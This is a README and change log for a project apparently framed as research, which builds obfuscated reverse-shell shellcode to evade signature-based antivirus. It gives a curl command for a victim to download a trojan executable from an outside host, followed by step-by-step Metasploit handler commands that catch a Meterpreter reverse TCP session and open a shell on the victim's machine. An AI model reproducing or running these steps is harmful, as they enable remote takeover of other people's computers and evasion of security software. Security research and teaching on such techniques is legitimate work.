# reverse-shell
Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus




# Change Log:

  10/14/2024
    Russell:
      - created GitHub repo and uploaded the research paper as well as our proposal.
      - created and uploaded reverse_tcp.exe via msfvenom which connects to attacker's IP (Windows antivirus detects it immediately and does not allow execution)

      
     To download the trojan as a victim:
            $curl -O http://bigbadcyborg.com/reverse_tcp.exe

      Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
      
      To download the metasploit installer:
      $curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

      $chmod 755 msfinstall

      $./msfinstall

      $sudo msfconsole

      To run listener on attackers machine:
      $msfconsole
      $use exploit/multi/handler
      $set PAYLOAD windows/x64/meterpreter/reverse_tcp
      $set LHOST your_ip
      $set LPORT 4444
      $exploit

      Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
      attacker enters the following command to enter the shell of the victim:
      $shell


      For a video explanation watch the following youtube video:
      https://www.youtube.com/watch?v=17JontiMrWQ
      

  

    
